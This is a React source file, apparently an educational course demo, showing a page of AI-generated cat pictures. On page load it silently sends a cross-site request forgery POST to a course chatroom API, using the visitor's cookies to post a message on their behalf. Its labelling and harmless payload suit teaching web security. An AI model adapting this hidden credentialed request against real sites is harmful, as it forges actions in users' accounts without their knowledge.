
// !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
// FOR EDUCATIONAL PURPOSES ONLY
// !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!

import { Col, Container, Row } from 'react-bootstrap';
import Cat1 from './assets/cat1.png'
import Cat2 from './assets/cat2.png'
import Cat3 from './assets/cat3.png'
import './App.css'
import 'bootstrap/dist/css/bootstrap.min.css';
import { useEffect } from 'react';

function App() {
  useEffect(() => {
    fetch(`https://cs571.org/api/s24/hw6/messages?chatroom=${encodeURIComponent("Picnic Point Pathfinders")}`, {
            method: "POST",
            credentials: 'include',
            headers: {
                "Content-Type": "application/json",
                "X-CS571-ID": CS571.getBadgerId(),
            },
            body: JSON.stringify({
                title: "hello from xsrf",
                content: "another site requested that I post this!"
            })
        })
  }, [])

  return (
   <div>
      <h1>Look at these adorable cats!</h1>
      <p>Generated with OpenAI... None of them are real :(</p>
      <Container fluid>
        <Row>
          <Col xs={12} md={4}><img src={Cat1} alt="A cute cat, comfortably sitting in a cozy room" style={{width: "100%", marginBottom: "1rem"}}/></Col>
          <Col xs={12} md={4}><img src={Cat2} alt="A charming kitten playing with a ball of yarn" style={{width: "100%", marginBottom: "1rem"}}/></Col>
          <Col xs={12} md={4}><img src={Cat3} alt="A small kitten peeking out from a pile of autumn leaves" style={{width: "100%", marginBottom: "1rem"}}/></Col>
        </Row>
      </Container>
      <p>Oh... We may have posted something Picnic Point Pathfinders on your behalf...</p>
   </div>
  )
}

export default App
